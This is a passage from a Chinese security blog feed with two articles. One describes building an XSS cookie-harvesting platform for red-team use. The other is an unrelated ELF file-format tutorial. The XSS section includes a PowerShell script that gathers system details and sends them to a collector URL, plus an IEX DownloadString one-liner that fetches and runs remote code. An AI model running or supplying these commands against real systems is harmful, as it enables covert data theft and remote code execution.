class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#文件内容还要加密</span></span><br><span class="line">                CrossSiteScriptProject().Write(file_name=JavaScriptSaveFileName,uid=Uid,project_name=ProjectName)<span class="comment">#写到数据库表中</span></span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: JavaScriptSaveFileName, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)<span class="comment">#返回创建好的文件名</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧&quot;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">403</span>, &#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            ErrorLog().Write(<span class="string">&quot;Web_CrossSiteScriptHub_CrossSiteScript_GenerateProject(def)&quot;</span>, e)</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;呐呐呐！莎酱被玩坏啦(&gt;^ω^&lt;)&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">169</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用Post请求&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure><ul><li><code>RequestLogRecord</code>和<code>UserOperationLogRecord</code>函数是用户行为判断使用的的</li><li><code>UserInfo().QueryUidWithToken(UserToken)</code>是对用户传入的token进行权限验证的</li><li><code>ErrorLog().Write()</code>是对报错日志进行一个写入操作的，这几个函数都不用去管它，这不在我们的介绍中</li></ul><p>1.首先函数通过判断用户的请求方式</p><p>2.当用户使用POST的时候，进行用户传入<code>project_name</code>、<code>javascript_data</code>、<code>token</code>三个值的获取</p><p>3.通过获取到的<code>token</code>值进行查询用户的UID值</p><p>4.如果UID不为空且传入的<code>javascript_data</code>值不为空，进行文件名生成</p><p>5.当文件名不冲突的时候进行拼接写入到本地，并且传入到数据库中</p><h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><h3 id="设置靶机"><a href="#设置靶机" class="headerlink" title="设置靶机"></a>设置靶机</h3><p>用PHPstudy快速搭建一个受害者机器，利用php来生成一个cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;分享demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello world&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;hacker by ascotbe&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/8.png?raw=true" alt="image-20210108144136426"></p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>创建好需要替换掉文本中的ip和项目文件地址这两个参数</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/9.gif?raw=true" alt="2"></p><h3 id="构建POC"><a href="#构建POC" class="headerlink" title="构建POC"></a>构建POC</h3><p>接着我们在靶机上面添加XSS内容，IP填你的域名或者你后端的地址</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/10.png?raw=true" alt="image-20210108160245965"></p><h3 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h3><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/11.gif?raw=true" alt="3"></p><p>可以看到上图<strong>1.php</strong>文件生成了一个cookie，然后加载了云端的js脚本，最后像云端发送了数据</p><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>其实很多时候当目标机器可以无回显执行命令时使用，我们用的dnslog来获取数据会很慢，还可以通过powershell获取数据</p><h3 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h3><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/12.png?raw=true" alt="image-20210108170533024"></p><p>这边把js文件内容替换成powershell命令，然后创建项目</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Desktop</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Desktop</span><br><span class="line"><span class="variable">$BIOS</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_BIOS</span><br><span class="line"><span class="variable">$Processor</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Processor | <span class="built_in">Select-Object</span> <span class="literal">-ExcludeProperty</span> <span class="string">&quot;CIM*&quot;</span></span><br><span class="line"><span class="variable">$QuickFixEngineering</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_QuickFixEngineering</span><br><span class="line"><span class="variable">$OperatingSystem</span> =<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_OperatingSystem | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Build*,OSType,ServicePack*</span><br><span class="line"><span class="variable">$LogicalDisk</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_LogicalDisk <span class="literal">-Filter</span> <span class="string">&quot;DriveType=3&quot;</span></span><br><span class="line"><span class="variable">$ComputerSystem</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_ComputerSystem <span class="literal">-Property</span> UserName</span><br><span class="line"><span class="variable">$R</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-URI</span> http://ip/a/项目文件名/?Desktop=<span class="variable">$Desktop</span><span class="string">&quot;&amp;&quot;</span>BIOS=<span class="variable">$BIOS</span><span class="string">&quot;&amp;&quot;</span>Processor=<span class="variable">$Processor</span><span class="string">&quot;&amp;&quot;</span>ComputerSystem=<span class="variable">$ComputerSystem</span><span class="string">&quot;&amp;&quot;</span><span class="variable">$QuickFixEngineering</span>=QuickFixEngineering<span class="string">&quot;&amp;&quot;</span>OperatingSystem=<span class="variable">$OperatingSystem</span><span class="string">&quot;&amp;&quot;</span>LogicalDisk=<span class="variable">$LogicalDisk</span> </span><br></pre></td></tr></table></figure><h3 id="运行演示"><a href="#运行演示" class="headerlink" title="运行演示"></a>运行演示</h3><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;10.91.212.184:9999&#x2F;s&#x2F;eeUZF&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/13.gif?raw=true" alt="4"></p><h2 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h2><p>大部分白帽子测试漏洞就是进行一个普通弹窗演示，但是正常打红队，想要获取目标客服的一些信息的时候，由于信任以及网址被WAF拦截等情况，导致各种问题，并且无开源项目</p><p>本文介绍了一个XSS平台从头到尾的诞生，以及利用原理，虽然代码没有具体详细讲解，主要是太过于枯燥，感兴趣的师傅直接看项目源码就能够看懂，几乎是每一行都有注释，项目整体一个大的模块写下来花了小半个月时间，虽然功能不多，但是当时想写一个这个模块的时候，无从下手只能去看网上别人搭建的平台，通过注册抓包看逻辑结构，进行理解。每次动手写东西的时候都能收获许多东西，多学多谢才能从开发的角度去找漏洞。</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux ELF格式解析</title>
    <link href="https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/"/>
    <id>https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/</id>
    <published>2020-12-06T15:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2></blockquote><p>在写PE结构解析的时候，以为ELF结构没必要去看文件结构，直到后面做了PWN题发现不是这样的，所有还是学习下ELF结构，然后再写个解析器</p><blockquote><h2 id="常见结构区分"><a href="#常见结构区分" class="headerlink" title="常见结构区分"></a>常见结构区分</h2></blockquote><p>目前，PC平台流行的可执行文件格式（Executable）主要包含如下两种，它们都是<strong>COFF</strong>（Common File Format）格式的变种</p><ul><li>Windows下的<strong>PE</strong>（Portable Executable）</li><li>Linux下的<strong>ELF</strong>（Executable Linkable Format）</li></ul><p><strong>源代码经过编译后但未进行连接的那些中间文件</strong>（Windows的<code>.obj</code>和Linux的<code>.o</code>），它与可执行文件的格式非常相似，所以一般跟可执行文件格式一起采用同一种格式存储。</p><p>其中动态链接库（<strong>DDL，Dynamic Linking Library</strong>）和静态链接库（<strong>Static Linking Library</strong>）的格式都和当前系统对应的可执行文件结构一样</p><ul><li>动态链接库：Windows的<code>.dll</code>、Linux的<code>.so</code></li><li>静态链接库：Windows的<code>.lib</code>、Linux的<code>.a</code></li></ul><blockquote><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2></blockquote><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><p>ELF文件有三种类型，可以通过ELF Header中的<code>e_type</code>成员进行区分：</p><ul><li><strong>可重定位文件（Relocatable File）</strong>：<code>ETL_REL</code>。一般为<code>.o</code>文件，可以与其他目标文件链接来创建可执行文件或共享目标文件的代码和数据。静态链接库属于可重定位文件</li><li><strong>可执行文件（Executable File）</strong>：<code>ET_EXEC</code>。可以执行的一个程序，此文件规定了exec()如何创建一个程序的进程映像。</li><li>共享目标文件（Shared Object File）：<code>ET_DYN</code>。一般为<code>.so</code>文件。<ul><li>链接器将其与其他可重定位文件、共享目标文件链接成新的目标文件；</li><li>动态链接器（Dynamic Linker）将其与某个可执行文件或其他共享目标文件结合一个可执行文件，创建进程映像。</li></ul></li></ul><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ELF/1.png?raw=true" alt="img"></p><p>如图所示，为ELF文件的基本结构，主要由四部分组成：</p><ul><li>ELF Header</li><li>ELF Program Header Table（或称Program Headers、程序头）</li><li>ELF Section Header Table（或称Section Headers、节头表）</li><li>ELF Section</li></ul><p>从图中，就能看出它们各自的数据结构以及相互之间的索引关系。下面依次介绍。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ELF/2.png?raw=true" alt="png"></p><p>段（<code>Segment</code>）与节（<code>Section</code>）的区别在于，段是程序执行的必要组成，当多个目标文件链接成一个可执行文件时，会将相同权限的节合并到一个段中。相比而言，节的粒度更小。</p><hr><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>文件的最开始几个字节给出如何解释文件的提示信息。 这些信息独立于处理器， 也独立于文件中的其余内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT]; <span class="comment">//magic number</span></span><br><span class="line">Elf32_Half e_type;                <span class="comment">//Ojbect file type</span></span><br><span class="line">Elf32_Half e_machine;             <span class="comment">//Architecture</span></span><br><span class="line">Elf32_Word e_version;             <span class="comment">//Object file version </span></span><br><span class="line">Elf32_Addr e_entry;               <span class="comment">//entry point</span></span><br><span class="line">Elf32_Off  e_phoff;               <span class="comment">//程序头内容在文件的偏移量</span></span><br><span class="line">Elf32_off  e_shoff;               <span class="comment">//段头内容在文件的偏移量</span></span><br><span class="line">Elf32_Word e_flags;</span><br><span class="line">Elf32_Half e_ehsize;              <span class="comment">//elf头部大小</span></span><br><span class="line">Elf32_Half e_phentsize;           <span class="comment">//程序头部表格的表项大小</span></span><br><span class="line">Elf32_Half e_phnum;               <span class="comment">//程序头的个数Program header</span></span><br><span class="line">Elf32_Half e_shentsize;           <span class="comment">//节区头部表格的表项大小</span></span><br><span class="line">Elf32_Half e_shnum;               <span class="comment">//段头的个数Section header</span></span><br><span class="line">Elf32_Half e_shstrndx;            <span class="comment">//String段在整个段列表中的索引值</span></span><br><span class="line">&#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h4 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h4><h5 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h5><p>数组给出了ELF的一些标识信息，这个数组中不同下标的含义如表所示：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ELF/3.png?raw=true" alt="png"></p><p>这些索引访问包含以下数值的字节：</p><ul><li><p>EI_MAG0 到 EI_MAG3：<strong>魔数（Magic Number）</strong>，标志此文件是一个ELF目标文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称            取值         位置</span><br><span class="line">EI_MAG0        0x7f       e_ident[EI_MAG0]</span><br><span class="line">EI_MAG1        &#39;E&#39;        e_ident[EI_MAG1]</span><br><span class="line">EI_MAG2        &#39;L&#39;        e_ident[EI_MAG2]</span><br><span class="line">EI_MAG3        &#39;F&#39;        e_ident[EI_MAG3]</span><br></pre></td></tr></table></figure></li><li><p>EI_CLASS：标识文件的类别，或者说，容量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称             取值            位置</span><br><span class="line">ELFCLASSNONE     0            非法类别</span><br><span class="line">ELFCLASS32       1            32位目标</span><br><span class="line">ELFCLASS64       2            64位目标</span><br><span class="line">ps:ELFCLASS32支持虚存范围4GB，ELFCLASS64是为64位预留的，不过文件中的其他内容都没有针对64位定义</span><br></pre></td></tr></table></figure></li><li><p>EI_DATA：字节e_ident[EI_DATA] 给出处理器特定数据的数据编码方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">名称            取值              位置</span><br><span class="line">ELFDATANONE     0             非法数据编码</span><br><span class="line">ELFDATA2LSB     1             高位在前</span><br><span class="line">ELFDATA2MSB     2             低位在前</span><br></pre></td></tr></table></figure></li><li><p>EI_VERSION：ELF头部的版本号码，目前此值必须是EV_CURRENT。</p></li><li><p>EI_PAD：标记e_ident中未使用字节的开始，初始化为0。</p></li></ul><hr><h5 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h5><p>目标文件类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">ET_NONE         0         未知目标文件格式</span><br><span class="line">ET_REL          1         可重定位文件</span><br><span class="line">ET_EXEC         2         可执行文件</span><br><span class="line">ET_DYN          3         共享目标文件</span><br><span class="line">ET_CORE         4         Core文件（转储格式）</span><br><span class="line">ET_LOPROC     0xff00      特定处理器文件</span><br><span class="line">ET_HIPROC     0xffff      特定处理器文件</span><br><span class="line">ps:ET_LOPROC和ET_HIPROC之间的取值用来标识与处理器相关的文件格式</span><br></pre></td></tr></table></figure><hr><h5 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h5><p>给出文件的目标体系结构类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">EM_NONE         0           未指定</span><br><span class="line">EM_M32          1           AT&amp;T WE 32100</span><br><span class="line">EM_SPARC        2           SPARC</span><br><span class="line">EM_386          3           Intel 80386</span><br><span class="line">EM_68K          4           Motorola 68000</span><br><span class="line">EM_88K          5           Motorola 88000</span><br><span class="line">EM_860          7           Intel 80860</span><br><span class="line">EM_MIPS         8           MIPS RS3000</span><br><span class="line">ps:其他值都是保留的。特定处理器的ELF名称会使用机器名来进行区分。</span><br></pre></td></tr></table></figure><hr><h5 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h5><p>目标文件版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">  EV_NONE         0           非法版本</span><br><span class="line">  EV_CURRENT      1           当前版本</span><br></pre></td></tr></table></figure><hr><h5 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h5><p>程序入口的虚拟地址，如果目标文件没有程序入口，可以为0</p><hr><h5 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h5><p>程序头部表格（Program Header Table）的偏移量（按字节计算）。如果文件没有程序头部表格，可以为0</p><hr><h5 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h5><p>节区头部表格（Section Header Table）的偏移量（按字节计算）。如果文件没有节区头部表格，可以为0</p><hr><h5 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h5><p>保存与文件相关的，特定于处理器的标志。标志名称采用EF_machine_flag的格式</p><hr><h5 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h5><p>ELF头部的大小（以字节计算）</p><hr><h5 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h5><p>程序头部表格的表项大小（按字节计算）</p><hr><h5 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h5><p>程序头部表格的表项数目。可以为0</p><hr><h5 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h5><p>节区头部表格的表项大小（按字节计算）</p><hr><h5 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h5><p>节区头部表格的表项数目。可以为0</p><hr><h5 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h5><p>节区头部表格中与节区名称字符串表相关的表项的索引。如果文件没有节区名称字符串表，此参数可以为SHN_UNDEF</p><h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux ubuntu 5.4.0-55-generic #61-Ubuntu SMP Mon Nov 9 20:49:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">ascotbe@ubuntu:~$ readelf -h /bin/sh</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x5cd0</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          127896 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         13</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         30</span></span><br><span class="line"><span class="string">  Section header string table index: 29</span></span><br></pre></td></tr></table></figure><p>ELF文件结构示意图中定义的<code>ELF_Endr</code>的各个成员的含义与readelf具有对应关系：</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>e_ident</td><td>Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</td></tr><tr><td></td><td>class: ELF64</td></tr><tr><td></td><td>Data: 2’s complement, little endian</td></tr><tr><td></td><td>Version: 1 (current)</td></tr><tr><td></td><td>OS/ABI: UNIX - System V</td></tr><tr><td></td><td>ABI Version: 0</td></tr><tr><td>e_type</td><td>Type: DYN (Shared object file)</td></tr><tr><td></td><td>共享目标文件</td></tr><tr><td>e_machine</td><td>Advanced Micro Devices X86-64</td></tr><tr><td></td><td>ELF文件的CPI平台属性</td></tr><tr><td>e_version</td><td>Version: 0x1</td></tr><tr><td></td><td>ELF版本号。一般为常数1</td></tr><tr><td>e_entry</td><td>Entry point address: 0x5cd0</td></tr><tr><td></td><td>入口地址，规定ELF程序的入口虚拟地址，操作系统在加载完该程序后从这个地址开始执行进程的指令。</td></tr><tr><td>e_phoff</td><td>Start of program headers: 64 (bytes into file)</td></tr><tr><td>e_shoff</td><td>Start of section headers: 127896 (bytes into file)</td></tr><tr><td></td><td>Section Header Table 在文件中的偏移</td></tr><tr><td>e_word</td><td>Flags: 0x0</td></tr><tr><td></td><td>ELF标志位，用来标识一些ELF文件平台相关的属性</td></tr><tr><td>e_ehsize</td><td>Size of this header: 64(bytes)</td></tr><tr><td></td><td>ELF Header本身的大小</td></tr><tr><td>e_phentsize</td><td>Size of program headers:56 (bytes)</td></tr><tr><td>e_phnum</td><td>Number of program headers: 13</td></tr><tr><td>e_shentsize</td><td>Size of section headers: 64 (bytes)</td></tr><tr><td></td><td>单个Section Header大小</td></tr><tr><td>e_shnum</td><td>Number of section headers: 30</td></tr><tr><td></td><td>Section Header的数量</td></tr><tr><td>e_shstrndx</td><td>Section header string table index: 29</td></tr><tr><td></td><td>Section Header字符串在Section Header Table中的索引</td></tr></tbody></table><h3 id="ELF-Section-Header-Table"><a href="#ELF-Section-Header-Table" class="headerlink" title="ELF Section Header Table"></a>ELF Section Header Table</h3><p>ELF节头表是一个节头数组。每一个节头都描述了其所对应的节的信息，如节名、节大小、在文件中的偏移、读写权限等。<strong>编译器、链接器、装载器都是通过节头表来定位和访问各个节的属性的。</strong></p><p><code>e_shoff</code>成员给出从文件头到节区头部表格的偏移字节数；<code>e_shnum</code>给出表格中条目数目；<code>e_shentsize</code>给出每个项目的字节数。从这些信息中可以确切地定位节区的具体位置、长度。</p><p>节区头部表格中比较特殊的几个小标如下：</p><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>SHN_UNDEF</td><td>0</td><td>标记未定义的、缺失的、不相关的，或者没有含义的节区引用</td></tr><tr><td>SHN_LORESERVE</td><td>0xFF00</td><td>保留索引的下界</td></tr><tr><td>SHN_LOPROC</td><td>0xFF00</td><td>保留给处理器特殊的语义</td></tr><tr><td>SHN_HIPROC</td><td>0xFF1F</td><td>保留给处理器特殊的语义</td></tr><tr><td>SHN_ABS</td><td>0xFFF1</td><td>包含对应引用量的绝对取值。这些值不会被重定位所影响</td></tr><tr><td>SHN_COMMON</td><td>0xFFF2</td><td>相对于此节区定义的符号是公共符号。如FORTRAN中COMMON或者未分配的C外部变量</td></tr><tr><td>SHN_HIRESERVE</td><td>0xFFFF</td><td>保留索引的上界</td></tr></tbody></table><p>介于<code>SHN_LORESERVE</code>和<code>SHN_HIRESERVE</code>之间的表项不会出现在节区头部表中。</p><p>每个节区头部可用如下数据结构描述:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;      <span class="comment">//给出节区名称。是节区头部字符串节区（Section Header String Table Section）的索引。名字是一个NULL结尾的字符串，保存在一个名为.shstrtab的字符串表（可通过Section Header索引到）</span></span><br><span class="line">    Elf32_Word sh_type;      <span class="comment">//节类型。为节区的内容和语义进行分类。</span></span><br><span class="line">    Elf32_Word sh_flags;     <span class="comment">//节标志位。节区支持1位形式的标志，这些标志描述了多种属性</span></span><br><span class="line">    Elf32_Addr sh_addr;      <span class="comment">//节的虚拟地址。如果节区将出现在进程的内存映像中或可被加载，则sh_addr为该节被加载后在进程地址空间中的虚拟地址，给出节区的每一个字节应处的位置。否则，此字段为0</span></span><br><span class="line">    Elf32_Off sh_offset;     <span class="comment">//节偏移。如果该节存在于文件中，则该节表示在文件中的偏移；否则无意义，如sh_offset对于BSS节来说就是没有意义的。即此成员的取值给出节区的第一个字节与文件头之间的偏移。</span></span><br><span class="line">    Elf32_Word sh_size;      <span class="comment">//节大小。此成员给出节区的长度（字节数）。除非节区的类型是SHT_NOBITS，否则节区占用文件中的sh_size字节。</span></span><br><span class="line">    Elf32_Word sh_link;      <span class="comment">//节链接信息。此成员给出节区头部表索引链接，其解释依赖于节区类型</span></span><br><span class="line">    Elf32_Word sh_info;      <span class="comment">//节链接信息。此成员给出附加信息，其解释依赖于节区类型</span></span><br><span class="line">    Elf32_Word sh_addralign; <span class="comment">//节地址对齐方式。某些节区带有地址对齐约束。</span></span><br><span class="line">    Elf32_Word sh_entsize;   <span class="comment">//节项大小。某些节区中包含固定大小的项目，如符号表，其包含的每个符号所在的大小都一样。</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>注意：索引为零（SHN_UNDFF）的节区头部也是存在的，尽管此索引标记的是未定义的节区引用，并且节区的内容固定</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ELF/4.png?raw=true" alt="png"></p><h4 id="部分字段解析"><a href="#部分字段解析" class="headerlink" title="部分字段解析"></a>部分字段解析</h4><h5 id="sh-type"><a href="#sh-type" class="headerlink" title="sh_type"></a>sh_type</h5><p>节名是一个字符串，只是在链接和编译过程中有意义，但它不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）</p><p>节的类型相关常量以<code>SHT_</code>开头，上述<code>readelf 